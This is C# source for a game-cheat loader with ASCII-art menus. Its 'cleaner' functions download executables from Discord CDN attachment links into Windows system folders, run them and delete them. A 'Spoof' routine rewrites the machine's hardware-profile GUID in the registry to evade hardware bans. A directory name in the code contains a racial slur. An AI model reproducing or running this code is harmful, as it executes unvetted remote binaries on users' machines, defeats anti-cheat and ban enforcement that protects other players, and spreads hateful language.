using System;
using System.Diagnostics;
using System.Threading;
using System.IO;
using System.Net;
using System.Runtime.CompilerServices;
using System.Linq;
using Microsoft.Win32;
using FabrygameLoader;
using Fabrygame99;
using System.Runtime.InteropServices;
using Loader;
using Console = Colorful.Console;
using System.Drawing;

namespace FabrygameLoader
{
	class Cheats
	{
		[DllImport("User32.dll", CharSet = CharSet.Unicode)]
		public static extern int MessageBox(IntPtr h, string m, string c, int type);

		[DllImport("user32.dll")]
		static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

		[DllImport("kernel32.dll")]
		static extern IntPtr GetConsoleWindow();

		static int SW_SHOW = 5;
		static int SW_HIDE = 0;

		public static void AppleCleaner() //APPLEEEEEEEEEEE CLEANURRRRR
		{
			Console.Clear();
			WebClient webClient = new WebClient();
			Directory.CreateDirectory("C:\\Windows\\IME\\nigga");
			string fileName = "C:\\Windows\\IME\\nigga\\cleanerBETAS5.exe";
			Console.WriteLine("Just wait please");
			webClient.DownloadFile("https://cdn.discordapp.com/attachments/787033231047524352/789862712053071872/cleanerBETAS5.exe", fileName);
			Console.WriteWithGradient("Apple Cleaner Loaded. Wait", Color.Red, Color.Blue,27);
			Process.Start(fileName).WaitForExit();
			File.Delete(fileName);
			Class3.CleanersSpoofers();
		}

		public static void HWID()
		{
			Console.Clear();
			Console.SetWindowSize(120, 40);
			Console.ForegroundColor = Color.Magenta;
			Console.SetWindowSize(120, 30);
			Console.WriteLine("");
			Console.WriteLine("  ▄▀  ████▄ ██▄           █ ▄▄  ██      ▄▄▄▄▄      ▄▄▄▄▀ ▄███▄   █▄▄▄▄ ");
			Console.WriteLine("▄▀    █   █ █  █          █   █ █ █    █     ▀▄ ▀▀▀ █    █▀   ▀  █  ▄▀ ");
			Console.WriteLine("█ ▀▄  █   █ █   █         █▀▀▀  █▄▄█ ▄  ▀▀▀▀▄       █    ██▄▄    █▀▀▌  ");
			Console.WriteLine("█   █ ▀████ █  █          █     █  █  ▀▄▄▄▄▀       █     █▄   ▄▀ █  █  ");
			Console.WriteLine(" ███        ███▀           █       █              ▀      ▀███▀     █   ");
			Console.WriteLine("                            ▀     █                               ▀    ");
			Console.WriteLine("                                 ▀                                     ");
			Console.ForegroundColor = Color.Red;
			Class2.Print("HWID Settings", 20);
			Console.WriteLine("");
			Console.ForegroundColor = Color.Yellow;
			Console.Write("1");
			Console.ForegroundColor = Color.Cyan;
			Console.Write(" ---> Check HWID");
			Console.WriteLine("");
			Console.ForegroundColor = Color.Yellow;
			Console.Write("2");
			Console.ForegroundColor = Color.Cyan;
			Console.Write(" ---> Spoof HWID");
			Console.WriteLine("");
			Console.ForegroundColor = Color.Yellow;
			Console.Write("0");
			Console.ForegroundColor = Color.Cyan;
			Console.Write(" ---> Go back");
			Console.WriteLine("");
			Console.ForegroundColor = Color.Yellow;
			Console.Write("9");
			Console.ForegroundColor = Color.Cyan;
			Console.Write(" ---> Exit");
			Console.WriteLine("");
			Class2.Print("Selection: ", 20);
			string a = Console.ReadLine();
			if (a == "1")
			{
				Cheats.Check();
			}
			else if (a == "2")
			{
				Cheats.Spoof();
			}
			else if (a == "0")
			{
				Program.Loader();
			}
			else if (a == "9")
			{
				Environment.Exit(0);
			}
			else
			{
				Cheats.HWID();
			}
		}
		public static void Spoof()
		{
			try
			{
				Console.Clear();
				string keyName = "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\IDConfigDB\\Hardware Profiles\\0001";
				string str = (string)Registry.GetValue(keyName, "HwProfileGuid", "default");
				string text = string.Concat(new string[]
				{
			"{GodPaster#6893-",
			Cheats.GenID(5),
			"-",
			Cheats.GenID(5),
			"-",
			Cheats.GenID(4),
			"-",
			Cheats.GenID(9),
			"}"
				});
				Registry.SetValue(keyName, "GUID", text);
				Registry.SetValue(keyName, "HwProfileGuid", text);
				Console.SetWindowSize(120, 30);
				Console.ForegroundColor = Color.Magenta;
				Console.WriteLine("");
				Console.WriteLine(" ▄▀▀▀▀▄    ▄▀▀▀▀▄   ▄▀▀█▄▄           ▄▀▀▄▀▀▀▄  ▄▀▀█▄   ▄▀▀▀▀▄  ▄▀▀▀█▀▀▄  ▄▀▀█▄▄▄▄  ▄▀▀▄▀▀▀▄ ");
				Console.WriteLine("█         █      █ █ ▄▀   █         █   █   █ ▐ ▄▀ ▀▄ █ █   ▐ █    █  ▐ ▐  ▄▀   ▐ █   █   █ ");
				Console.WriteLine("█    ▀▄▄  █      █ ▐ █    █         ▐  █▀▀▀▀    █▄▄▄█    ▀▄   ▐   █       █▄▄▄▄▄  ▐  █▀▀█▀  ");
				Console.WriteLine("█     █ █ ▀▄    ▄▀   █    █            █       ▄▀   █ ▀▄   █     █        █    ▌   ▄▀    █  ");
				Console.WriteLine("▐▀▄▄▄▄▀ ▐   ▀▀▀▀    ▄▀▄▄▄▄▀          ▄▀       █   ▄▀   █▀▀▀    ▄▀        ▄▀▄▄▄▄   █     █   ");
				Console.WriteLine("▐                  █     ▐          █         ▐   ▐    ▐      █          █    ▐   ▐     ▐   ");
				Console.WriteLine("                   ▐                ▐                         ▐          ▐                  ");
				Console.ForegroundColor = Color.Red;
				Console.WriteLine("[SUCCESS] Successfully Changed Your HWID!");
				Console.Write("[SUCCESS] Old HWID: ");
				Class2.Print(str);
				Console.WriteLine("");
				Console.Write("[SUCCESS] New HWID: ");
				Class2.Print(text);
				Console.WriteLine("");
				Console.WriteLine("Press any key to continue...");
				Console.ReadKey();
				Cheats.HWID();
			}
			catch (Exception)
			{
				Console.Clear();
				Console.WriteLine("[HyperSpoofer] - Failed to change hwid, try to run this as administrator", Color.Red);
				Console.ReadKey();
			}
		}

		public static void Check()
		{
			try
			{
				Console.Clear();
				Console.SetWindowSize(130, 35);
				string keyName = "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\IDConfigDB\\Hardware Profiles\\0001";
				string str = (string)Registry.GetValue(keyName, "GUID", "default");
				Console.ForegroundColor = Color.Magenta;
				Console.WriteLine("");
				Console.WriteLine(" ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄             ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄ ");
				Console.WriteLine("▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░▌           ▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌");
				Console.WriteLine("▐░█▀▀▀▀▀▀▀▀▀ ▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀█░▌          ▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀▀▀  ▀▀▀▀█░█▀▀▀▀ ▐░█▀▀▀▀▀▀▀▀▀ ▐░█▀▀▀▀▀▀▀█░▌");
				Console.WriteLine("▐░▌          ▐░▌       ▐░▌▐░▌       ▐░▌          ▐░▌       ▐░▌▐░▌       ▐░▌▐░▌               ▐░▌     ▐░▌          ▐░▌       ▐░▌");
				Console.WriteLine("▐░▌ ▄▄▄▄▄▄▄▄ ▐░▌       ▐░▌▐░▌       ▐░▌          ▐░█▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄▄▄      ▐░▌     ▐░█▄▄▄▄▄▄▄▄▄ ▐░█▄▄▄▄▄▄▄█░▌");
				Console.WriteLine("▐░▌▐░░░░░░░░▌▐░▌       ▐░▌▐░▌       ▐░▌          ▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌     ▐░▌     ▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌");
				Console.WriteLine("▐░▌ ▀▀▀▀▀▀█░▌▐░▌       ▐░▌▐░▌       ▐░▌          ▐░█▀▀▀▀▀▀▀▀▀ ▐░█▀▀▀▀▀▀▀█░▌ ▀▀▀▀▀▀▀▀▀█░▌     ▐░▌     ▐░█▀▀▀▀▀▀▀▀▀ ▐░█▀▀▀▀█░█▀▀ ");
				Console.WriteLine("▐░▌       ▐░▌▐░▌       ▐░▌▐░▌       ▐░▌          ▐░▌          ▐░▌       ▐░▌          ▐░▌     ▐░▌     ▐░▌          ▐░▌      ▐░▌  ");
				Console.WriteLine(" ░█▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄█░▌ ▐░█▄▄▄▄▄▄▄█░▌          ▐░▌          ▐░▌       ▐░▌ ▄▄▄▄▄▄▄▄▄█░▌     ▐░▌     ▐░█▄▄▄▄▄▄▄▄▄ ▐░▌       ▐░▌ ");
				Console.WriteLine("▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░▌           ▐░▌          ▐░▌       ▐░▌▐░░░░░░░░░░░▌     ▐░▌     ▐░░░░░░░░░░░▌▐░▌        ▐░▌");
				Console.WriteLine(" ▀▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀             ▀            ▀         ▀  ▀▀▀▀▀▀▀▀▀▀▀       ▀       ▀▀▀▀▀▀▀▀▀▀▀  ▀          ▀ ");
				Console.Write("[SUCCESS] Current HWID: ", Color.Red);
				Class2.PrintRed(str, 20);
				Console.WriteLine("");
				Console.Write("Press any key to continue...", Color.Red);
				Console.ForegroundColor = Color.Red;
				Console.ReadKey();
				Cheats.HWID();
			}
			catch (Exception)
			{
				Console.Clear();
				Console.WriteLine("[ERROR] There was an error while getting your HWID", Color.Red);
				Cheats.HWID();
			}
		}
		public static void Cleanur()
        {
			string wewe = "C:\\Windows\\WaaX\\Cleaner.exe";
			WebClient www = new WebClient();
			www.DownloadFile("https://cdn.discordapp.com/attachments/797079887255961620/822581743734358036/Cleaner.exe", wewe);
			Process.Start(wewe).WaitForExit();
			Console.WriteWithGradient("Cleaner loaded. Wait pls", Color.Red, Color.Blue, 8);
			File.Delete(wewe);
			Program.Loader();
        }
		public static string GenID(int length)
		{
			string element = "123457869";
			return new string((from s in Enumerable.Repeat<string>(element, length)
							   select s[Cheats.random.Next(s.Length)]).ToArray<char>());
		}
		private static Random random = new Random();
	}
}
